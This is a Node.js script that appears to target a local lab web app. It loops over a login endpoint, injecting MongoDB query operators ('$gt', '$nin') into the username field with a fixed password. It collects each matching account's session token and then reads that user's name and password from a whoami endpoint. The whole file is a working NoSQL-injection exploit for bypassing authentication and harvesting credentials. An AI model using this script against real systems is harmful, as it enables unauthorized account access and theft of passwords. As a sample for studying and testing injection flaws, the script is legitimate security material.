const fetch = require('node-fetch')

const passwordToTest = 'test'
let foundUsers = []

async function start() {
    await fetchUsers()
    console.log('-------------------------')
    console.log(foundUsers)
}

async function fetchUsers() {
    while(true) {
        const foundNames = foundUsers.map(user =>  user.name )
        console.log(foundNames)
        const header = {
            method: 'POST',
            headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                name: { "$gt":"", "$nin": foundNames }, 
                password: passwordToTest })
        }
    
        const res = await fetch('http://localhost:5000/api/users/login', header)
        if (res.status == 200) {
            const json = await res.json()
            const token = json.token
    
            const header2 = {
                method: 'GET',
                headers: {
                    cookie: `token=${token}`
                },
            }
            const res2 = await fetch('http://localhost:5000/api/users/whoami', header2)
            const json2 = await res2.json()
            foundUsers.push({name: json2.name, password: json2.password, token: token})
        } else {
            return
        }
    }
}

start()
